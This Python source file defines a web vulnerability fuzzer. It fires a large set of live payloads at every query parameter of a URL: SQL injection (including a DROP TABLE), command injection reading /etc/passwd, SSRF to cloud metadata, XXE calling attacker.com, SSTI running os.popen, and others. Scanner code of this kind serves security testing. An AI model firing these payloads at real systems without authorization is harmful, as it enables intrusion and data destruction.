import requests

class Fuzzer:
    def __init__(self, session):
        self.session = session
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1", "' UNION SELECT NULL--", "admin'--", "' OR 1=1--", 
                "1; DROP TABLE users", "1' WAITFOR DELAY '0:0:5'--", 
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1'; EXEC xp_cmdshell('dir')--", "1' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
                "1' OR (SELECT COUNT(*) FROM sysobjects) > 0--", "1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
            ],
            "xss": [
                "<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>",
                "javascript:alert('XSS')", "onload=alert('XSS')", 
                "<img src=x onerror=alert('XSS')>", "{{7*7}}", "${7*7}",
                "<!--#exec cmd=\"id\"-->", "<svg onload=alert('XSS')>",
                "javascript:confirm('XSS')", "javascript:prompt('XSS')"
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd", "c:\\windows\\system32\\drivers\\etc\\hosts",
                "../../../../etc/passwd%00", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
            ],
            "cmdi": [
                "; ls -la", "| whoami", "&& id", "|| ping -c 1 localhost",
                "`id`", "$(id)", "| dir", "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "; cat /etc/passwd", "| net user", "; pwd", "| ipconfig",
                "&& netstat -an", "; ps aux", "| systeminfo"
            ],
            "idor": [
                "../user/1", "./admin/../user/2", "user/0", "api/user/1", 
                "admin/../../user/3", "user/12345", "account/1", "profile/1",
                "customer/1", "order/1", "invoice/1", "document/1"
            ],
            "ssrf": [
                "http://localhost:22", "http://127.0.0.1:22", "http://169.254.169.254/latest/meta-data/",
                "http://localhost:80/admin", "http://127.0.0.1:6379", "http://0.0.0.0:8080",
                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stat",
                "http://localhost:9200", "http://127.0.0.1:27017", "http://localhost:5984",
                "http://169.254.169.254/metadata/instance", "http://metadata.google.internal"
            ],
            "xxe": [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
                "<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&ent;</firstName></userInfo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", 
                "{{''.__class__.__mro__[1].__subclasses__()}}", 
                "{{config}}", "{{settings.SECRET_KEY}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            "header_injection": [
                "localhost:80\nX-Forwarded-Host: evil.com",
                "example.com\r\nX-Forwarded-For: 127.0.0.1",
                "test.com\r\nHost: evil.com",
                "api.example.com\nX-Real-IP: 127.0.0.1",
                "example.com\r\nReferer: evil.com"
            ],
            "jwt_tampering": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            ],
            "nosql_injection": [
                '{"$where": "this.owner == \'admin\'"}',
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$regex": ".*"}',
                '{"$where": "sleep(5000)"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}'
            ],
            "graphql_injection": [
                '{__schema{types{name}}}',
                'fragment __Type on __Type { name }',
                'query { __typename }',
                'mutation { createUser(input: {username: "admin", password: "password"}) { user { id } } }',
                'query { users { email password } }'
            ],
            "prototype_pollution": [
                '{"__proto__": {"isAdmin": true}}',
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                '{"__proto__": {"toString": function() { return "hacked"; }}}'
            ]
        }
    
    def fuzz_parameters(self, url):
        """Fuzz parameters with advanced payloads"""
        if '?' not in url:
            return []
            
        base_url, query_string = url.split('?', 1)
        params = {}
        
        for param in query_string.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
        
        vulnerabilities = []
        
        for param_name in params.keys():
            for payload_type, payload_list in self.payloads.items():
                for payload in payload_list:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        response = self.session.get(base_url, params=test_params, timeout=10)
                        vuln = self.check_vulnerabilities(response, base_url, "GET", test_params)
                        if vuln:
                            vulnerabilities.append(vuln)
                    except:
                        pass
        
        return vulnerabilities
    
    def check_vulnerabilities(self, response, url, method, params):
        """Check response for signs of vulnerabilities"""
        text = response.text.lower()
        resp_headers = str(response.headers).lower()
        
        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-01756", "postgresql", 
            "microsoft ole db provider", "syntax error", "mysql_num_rows",
            "mysqli_fetch", "pg_exec", "sqlite3", "unclosed quotation mark",
            "odbc", "jdbc", "database error"
        ]
        
        vulnerabilities = []
        
        if any(error in text for error in sql_errors):
            vulnerabilities.append({
                "type": "SQL Injection",
                "url": url,
                "method": method,
                "params": params,
                "evidence": "SQL error in response",
                "severity": "High"
            })
        
        if response.status_code < 500 and any(payload in response.text for payload in self.payloads["xss"]):
            vulnerabilities.append({
                "type": "XSS",
                "url": url,
                "method": method,
                "params": params,
                "evidence": "XSS payload reflected in response",
                "severity": "Medium"
            })
        
        if any(indicator in text for indicator in ["root:", "daemon:", "/bin/bash", "etc/passwd", "boot.ini", "windows/system32"]):
            vulnerabilities.append({
                "type": "Path Traversal",
                "url": url,
                "method": method,
                "params": params,
                "evidence": "Sensitive file content in response",
                "severity": "High"
            })
        
        if any(indicator in text for indicator in ["bin/bash", "www/html", "permission denied", "cannot access", "command not found", "volume in drive"]):
            vulnerabilities.append({
                "type": "Command Injection",
                "url": url,
                "method": method,
                "params": params,
                "evidence": "Command output in response",
                "severity": "High"
            })
        
        if response.status_code == 200 and any(indicator in url for indicator in ["user", "account", "profile", "id=", "uid="]):
            if any(indicator in text for indicator in ["email", "password", "admin", "user", "private", "secret"]):
                vulnerabilities.append({
                    "type": "IDOR",
                    "url": url,
                    "method": method,
                    "params": params,
                    "evidence": "Sensitive data exposure through IDOR",
                    "severity": "Medium"
                })
        
        security_headers = ["x-frame-options", "x-content-type-options", 
                           "x-xss-protection", "strict-transport-security",
                           "content-security-policy"]
        
        missing_headers = []
        for header in security_headers:
            if header not in resp_headers:
                missing_headers.append(header)
        
        if missing_headers:
            vulnerabilities.append({
                "type": "Missing Security Headers",
                "url": url,
                "method": method,
                "params": params,
                "evidence": f"Missing security headers: {', '.join(missing_headers)}",
                "severity": "Low"
            })
        
        return vulnerabilities
    
    def get_payloads(self, payload_type=None):
        """Get payloads by type or all payloads"""
        if payload_type:
            return self.payloads.get(payload_type, [])
        return self.payloads